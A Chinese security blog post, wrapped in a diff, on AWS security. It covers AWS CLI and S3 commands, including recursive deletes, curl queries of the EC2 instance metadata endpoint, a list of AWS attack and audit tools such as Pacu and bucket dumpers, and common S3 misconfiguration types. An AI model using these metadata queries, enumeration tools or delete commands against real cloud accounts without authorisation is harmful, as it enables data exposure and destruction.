@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="aws安装帮助文档：https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html linux下载安装 1234567891011--user 默认加载到~/.local/binpip3 install awscli --upgrade --user添加到环境变量export PATH=~/.local/bin:$P">
+<meta name="keywords" content="AWS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="aws安全问题">
+<meta property="og:url" content="https://wh0ale.github.io/2019/08/20/aws安全问题/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="aws安装帮助文档：https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html linux下载安装 1234567891011--user 默认加载到~/.local/binpip3 install awscli --upgrade --user添加到环境变量export PATH=~/.local/bin:$P">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_15-36-44.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/14898867985951.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_16-56-29.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_17-03-27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_17-48-19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-21_13-58-41.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/awssource1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/awscode-pipeline.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.422Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="aws安全问题">
+<meta name="twitter:description" content="aws安装帮助文档：https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html linux下载安装 1234567891011--user 默认加载到~/.local/binpip3 install awscli --upgrade --user添加到环境变量export PATH=~/.local/bin:$P">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-20_15-36-44.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/08/20/aws安全问题/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>aws安全问题 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/08/20/aws安全问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">aws安全问题
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-20 14:53:03" itemprop="dateCreated datePublished" datetime="2019-08-20T14:53:03+08:00">2019-08-20</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">29k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">26 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="aws安装"><a href="#aws安装" class="headerlink" title="aws安装"></a>aws安装</h1><p>帮助文档：<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html</a></p>
+<p>linux下载安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--user 默认加载到~/.local/bin</span><br><span class="line">pip3 install awscli --upgrade --user</span><br><span class="line"></span><br><span class="line">添加到环境变量</span><br><span class="line">export PATH=~/.local/bin:$PATH</span><br><span class="line"></span><br><span class="line">变量生效</span><br><span class="line">source ~/.profile</span><br><span class="line"></span><br><span class="line">~/.local » aws --version</span><br><span class="line">aws-cli/1.16.221 Python/3.5.2 Linux/4.4.0-130-generic botocore/1.12.211</span><br></pre></td></tr></table></figure>
+
+<h2 id="管理存储桶"><a href="#管理存储桶" class="headerlink" title="管理存储桶"></a>管理存储桶</h2><p>创建桶;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 mb s3://bucket-name</span><br></pre></td></tr></table></figure>
+
+<p>删除桶：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 rb s3://bucket-name</span><br></pre></td></tr></table></figure>
+
+<p>删除非空桶：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 rb s3://bucket-name --force</span><br></pre></td></tr></table></figure>
+
+<p>列出存储桶</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 ls</span><br></pre></td></tr></table></figure>
+
+<p>列出存储桶中所有的对象和文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 ls s3://bucket-name</span><br></pre></td></tr></table></figure>
+
+<p>列出桶中 bucket-name/MyFolder 中的对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 ls s3://bucket-name/MyFolder</span><br></pre></td></tr></table></figure>
+
+<h2 id="管理对象"><a href="#管理对象" class="headerlink" title="管理对象"></a>管理对象</h2><p>命令包括 aws s3 cp、aws s3 ls、aws s3 mv、aws s3 rm 和 sync。cp、ls、mv 和 rm 命令的用法与它们在 Unix 中的对应命令相同。 // 将当前目录里的 MyFile.txt文件拷贝到 s3://my-bucket/MyFolder</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 cp MyFile.txt s3://my-bucket/MyFolder/</span><br></pre></td></tr></table></figure>
+
+<p>将s3://my-bucket/MyFolder所有 .jpg 的文件移到 ./MyDirectory</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 mv s3://my-bucket/MyFolder ./MyDirectory --exclude &apos;*&apos; --include &apos;*.jpg&apos; --recursive</span><br></pre></td></tr></table></figure>
+
+<p>列出 my-bucket的所有内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 ls s3://my-bucket</span><br></pre></td></tr></table></figure>
+
+<p>列出my-bucket中MyFolder的所有内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 ls s3://my-bucket/MyFolder</span><br></pre></td></tr></table></figure>
+
+<p>删除 s3://my-bucket/MyFolder/MyFile.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 rm s3://my-bucket/MyFolder/MyFile.txt</span><br></pre></td></tr></table></figure>
+
+<p>删除 s3://my-bucket/MyFolder 和它的所有内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 rm s3://my-bucket/MyFolder --recursive</span><br></pre></td></tr></table></figure>
+
+<p>当 <code>–recursive 选项</code>与 cp、mv 或 rm 一起用于目录/文件夹时，命令会遍历目录树，包括所有子目录 sync命令 sync 命令的形式如下。可能的源-目标组合有： 本地文件系统到 Amazon S3 Amazon S3 到本地文件系统 Amazon S3 到 Amazon S3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 sync &lt;source&gt; &lt;target&gt; [--options]</span><br></pre></td></tr></table></figure>
+
+<p>例如：本地文件系统到S3中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws s3 sync 本地目录/. s3://my-bucket/目录</span><br></pre></td></tr></table></figure>
+
+<h2 id="什么是-Amazon-EC2？"><a href="#什么是-Amazon-EC2？" class="headerlink" title="什么是 Amazon EC2？"></a>什么是 Amazon EC2？</h2><p>Amazon Elastic Compute Cloud (Amazon EC2) 在 Amazon Web Services (AWS) 云中提供可扩展的计算容量。使用 Amazon EC2 可避免前期的硬件投入，因此你能够快速开发和部署应用程序。通过使用 <strong>Amazon EC2</strong>，你可以根据自身需要启动任意数量的虚拟服务器、配置安全和网络以及管理存储。Amazon EC2 允许你根据需要进行缩放以应对需求变化或流行高峰，降低流量预测需求。</p>
+<p>Amazon EC2 提供以下功能：</p>
+<ul>
+<li>虚拟计算环境，也称为<em>实例</em></li>
+<li>实例的预配置模板，也称为 <em>Amazon 系统映像 (AMI)</em>，其中包含你的服务器需要的程序包（包括操作系统和其他软件）。</li>
+<li>实例 CPU、内存、存储和网络容量的多种配置，也称为<em>实例类型</em></li>
+<li>使用<em>密钥对</em>的实例的安全登录信息（AWS 存储公有密钥，你在安全位置存储私有密钥）</li>
+<li>临时数据（停止或终止实例时会删除这些数据）的存储卷，也称为<em>实例存储卷</em></li>
+<li>使用 Amazon Elastic Block Store (Amazon EBS) 的数据的持久性存储卷，也称为 <em>Amazon EBS 卷</em>。</li>
+<li>用于存储资源的多个物理位置，例如实例和 Amazon EBS 卷，也称为<em>区域</em> 和<em>可用区</em></li>
+<li>防火墙，让你可以指定协议、端口，以及能够使用<em>安全组</em>到达你的实例的源 IP 范围</li>
+<li>用于动态云计算的静态 IPv4 地址，称为<em>弹性 IP 地址</em></li>
+<li>元数据，也称为<em>标签</em>，你可以创建元数据并分配给你的 Amazon EC2 资源</li>
+<li>你可以创建的虚拟网络，这些网络与其余 AWS 云在逻辑上隔离，并且你可以选择连接到你自己的网络，也称为 <em>Virtual Private Cloud</em>(VPC)</li>
+</ul>
+<p><a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/concepts.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/concepts.html</a></p>
+<h2 id="什么是-IAM？"><a href="#什么是-IAM？" class="headerlink" title="什么是 IAM？"></a>什么是 IAM？</h2><p>AWS Identity and Access Management (IAM) 是一种 Web 服务，可以帮助你安全地控制对 AWS 资源的访问。你可以使用 IAM 控制对哪个用户进行身份验证 (登录) 和授权 (具有权限) 以使用资源。</p>
+<p>当你首次创建 AWS 账户时，最初使用的是一个对账户中所有 AWS 服务和资源有完全访问权限的单点登录身份。此身份称为 AWS 账户 <em>根用户</em>，可使用你创建账户时所用的电子邮件地址和密码登录来获得此身份。强烈建议你不使用 根用户 执行日常任务，即使是管理任务。请遵守<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#create-iam-users" target="_blank" rel="noopener">仅将 根用户 用于创建首个 IAM 用户的最佳实践</a>。然后请妥善保存 根用户 凭证，仅用它们执行少数账户和服务管理任务。</p>
+<p><a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/introduction.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/introduction.html</a></p>
+<h2 id="实例元数据和用户数据"><a href="#实例元数据和用户数据" class="headerlink" title="实例元数据和用户数据"></a>实例元数据和用户数据</h2><p>实例元数据 是有关你的实例的数据，可以用来配置或管理正在运行的实例。实例元数据可划分成不同类别。有关更多信息，请参阅<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories" target="_blank" rel="noopener">实例元数据类别</a>。</p>
+<p>虽然你只能从实例自身内部访问实例元数据和用户数据，<strong>但数据并未进行加密保护。可访问实例的人员均可查看其元数据</strong>。因此，你应当采取适当的预防措施来保护敏感数据（例如永久加密密钥）。不应将敏感数据 (例如密码) 存储为用户数据。</p>
+<p>你也可以<strong>使用实例元数据访问你启动实例时指定的用户数据</strong>。例如，你可指定参数以便配置实例，也可附加简单的脚本。你也可以使用这些数据来构建更多可通过启动时提供的配置文件来修改的通用 AMI。例如，如果你为各种小型企业运行 Web 服务器，则这些企业都可以使用相同的 AMI，并在启动时从你在用户数据中指定的 Amazon S3 存储桶中检索其各自的内容。要随时添加一个新客户，你只需为该客户创建一个存储桶，将客户的内容添加进去，然后启动你的 AMI 即可。如果你同时启动多个实例，则用户数据可供该预留中的所有实例使用。</p>
+<p><strong>检索实例元数据</strong></p>
+<p>由于你的正在运行的实例存在实例元数据，因此你无需使用 <code>Amazon EC2</code>控制台或 <code>AWS CLI</code>。这在你编写脚本以实现从实例运行时非常有用。例如，你可从实例元数据访问你的实例的本地 IP 地址来以管理与外部应用程序的连接。</p>
+<p>要从运行实例内部查看所有类别的实例元数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>
+
+<p>IP 地址 <code>169.254.169.254</code> 是链路本地地址，仅从该实例有效。有关更多信息，请参阅 Wikipedia 上的<a href="https://en.wikipedia.org/wiki/Link-local_address" target="_blank" rel="noopener">链路本地地址</a>。</p>
+<p>使用一种诸如 cURL 的工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/</span><br></pre></td></tr></table></figure>
+
+<p>获得顶级元数据项目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>
+
+<p>示例获得前面示例中的一些元数据项目的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user ~]$ curl http://169.254.169.254/latest/meta-data/ami-id</span><br><span class="line">ami-0abcdef1234567890</span><br><span class="line">[ec2-user ~]$ curl http://169.254.169.254/latest/meta-data/reservation-id</span><br><span class="line">r-0efghijk987654321</span><br><span class="line">[ec2-user ~]$ curl http://169.254.169.254/latest/meta-data/public-hostname</span><br><span class="line">ec2-203-0-113-25.compute-1.amazonaws.com</span><br></pre></td></tr></table></figure>
+
+<p>获得可用公共密钥的列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user ~]$ curl http://169.254.169.254/latest/meta-data/public-keys/</span><br><span class="line">0=my-public-key</span><br></pre></td></tr></table></figure>
+
+<p>此示例显示了公用密钥 0 可用的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user ~]$ curl http://169.254.169.254/latest/meta-data/public-keys/0/</span><br><span class="line">openssh-key</span><br></pre></td></tr></table></figure>
+
+<p>获得公用密钥 0 (以 OpenSSH 密钥格式)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user ~]$ curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key</span><br><span class="line">ssh-rsa MIICiTCCAfICCQD6m7oRw0uXOjANBgkqhkiG9w0BAQUFADCBiDELMAkGA1UEBhMC</span><br><span class="line">VVMxCzAJBgNVBAgTAldBMRAwDgYDVQQHEwdTZWF0dGxlMQ8wDQYDVQQKEwZBbWF6</span><br><span class="line">b24xFDASBgNVBAsTC0lBTSBDb25zb2xlMRIwEAYDVQQDEwlUZXN0Q2lsYWMxHzAd</span><br><span class="line">BgkqhkiG9w0BCQEWEG5vb25lQGFtYXpvbi5jb20wHhcNMTEwNDI1MjA0NTIxWhcN</span><br><span class="line">MTIwNDI0MjA0NTIxWjCBiDELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAldBMRAwDgYD</span><br><span class="line">VQQHEwdTZWF0dGxlMQ8wDQYDVQQKEwZBbWF6b24xFDASBgNVBAsTC0lBTSBDb25z</span><br><span class="line">b2xlMRIwEAYDVQQDEwlUZXN0Q2lsYWMxHzAdBgkqhkiG9w0BCQEWEG5vb25lQGFt</span><br><span class="line">YXpvbi5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMaK0dn+a4GmWIWJ</span><br><span class="line">21uUSfwfEvySWtC2XADZ4nB+BLYgVIk60CpiwsZ3G93vUEIO3IyNoH/f0wYK8m9T</span><br><span class="line">rDHudUZg3qX4waLG5M43q7Wgc/MbQITxOUSQv7c7ugFFDzQGBzZswY6786m86gpE</span><br><span class="line">Ibb3OhjZnzcvQAaRHhdlQWIMm2nrAgMBAAEwDQYJKoZIhvcNAQEFBQADgYEAtCu4</span><br><span class="line">nUhVVxYUntneD9+h8Mg9q6q+auNKyExzyLwaxlAoo7TJHidbtS4J5iNmZgXL0Fkb</span><br><span class="line">FFBjvSfpJIlJ00zbhNYS5f6GuoEDmFJl0ZxBHjJnyp378OD8uTs7fLvjx79LjSTb</span><br><span class="line">NYiytVbZPQUQ5Yaxu2jXnimvw3rrszlaEXAMPLE my-public-key</span><br></pre></td></tr></table></figure>
+
+<p>获取实例的子网 ID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user ~]$ curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:29:96:8f:6a:2d/subnet-id</span><br><span class="line">subnet-be9b61d7</span><br></pre></td></tr></table></figure>
+
+<p>你也可以下载<a href="https://aws.amazon.com/code/ec2-instance-metadata-query-tool/" target="_blank" rel="noopener">实例元数据查询工具</a>，通过该工具，你无需键入完整的 URI 或目录名称就可以查询实例元数据。</p>
+<p>下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://s3.amazonaws.com/ec2metadata/ec2-metadata</span><br><span class="line">chmod u+x ec2-metadata</span><br></pre></td></tr></table></figure>
+
+<p>要获取实例的ami-id</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ec2-metadata -a</span><br><span class="line">ami-id：ami-xxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>获取公共主机名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ec2-metadata -p</span><br><span class="line">public-hostname：ec2-xxxx.compute-1.amazonaws.com</span><br></pre></td></tr></table></figure>
+
+<p>获取本地ipv4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ec2-metadata -o</span><br><span class="line">local-ipv4：10.xxx</span><br></pre></td></tr></table></figure>
+
+<h1 id="AWS工具集"><a href="#AWS工具集" class="headerlink" title="AWS工具集"></a>AWS工具集</h1><ul>
+<li><a href="https://github.com/RhinoSecurityLabs/Cloud-Security-Research" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/Cloud-Security-Research</a> PY.AWS云安全研究，工具集。</li>
+<li><a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/pacu</a> 亚马逊AWS漏洞检测框架</li>
+<li><a href="https://github.com/stuhirst/awssecurity/blob/master/arsenal.md" target="_blank" rel="noopener">https://github.com/stuhirst/awssecurity/blob/master/arsenal.md</a> AWS 安全检测相关的项目列表</li>
+<li><a href="https://github.com/toniblyx/my-arsenal-of-aws-security-tools" target="_blank" rel="noopener">https://github.com/toniblyx/my-arsenal-of-aws-security-tools</a> AWS安全工具集</li>
+<li><a href="https://github.com/sa7mon/S3Scanner" target="_blank" rel="noopener">https://github.com/sa7mon/S3Scanner</a> 扫描amazon公开的S3 buckets和dump</li>
+<li><a href="https://github.com/kromtech/s3-inspector" target="_blank" rel="noopener">https://github.com/kromtech/s3-inspector</a> 检测亚马逊AWS S3 bucket permissions</li>
+<li><a href="https://github.com/jordanpotti/AWSBucketDump" target="_blank" rel="noopener">https://github.com/jordanpotti/AWSBucketDump</a> 枚举AWS S3 buckets以查找敏感机密的文件</li>
+<li><a href="https://github.com/Netflix/repokid" target="_blank" rel="noopener">https://github.com/Netflix/repokid</a> AWS 最低权限策略部署工具</li>
+<li><a href="https://github.com/VirtueSecurity/aws-extender" target="_blank" rel="noopener"><strong>AWS Extender Burp插件</strong></a></li>
+</ul>
+<h1 id="aws漏洞类型"><a href="#aws漏洞类型" class="headerlink" title="aws漏洞类型"></a>aws漏洞类型</h1><p><strong>6种漏洞类型</strong></p>
+<p>AmazonS3 bucket允许匿名访问</p>
+<p>AmazonS3 bucket允许列出文件</p>
+<p>AmazonS3 Bucket允许任意文件上传和读取</p>
+<p>AmazonS3 bucket允许盲上传</p>
+<p>AmazonS3 bucket允许任意读取/写入对象</p>
+<p>AmazonS3 bucket显示ACP/ACL</p>
+<h1 id="aws-hackerone报告"><a href="#aws-hackerone报告" class="headerlink" title="aws hackerone报告"></a>aws hackerone报告</h1><p>Legal Robot：错误配置导致的信息泄露</p>
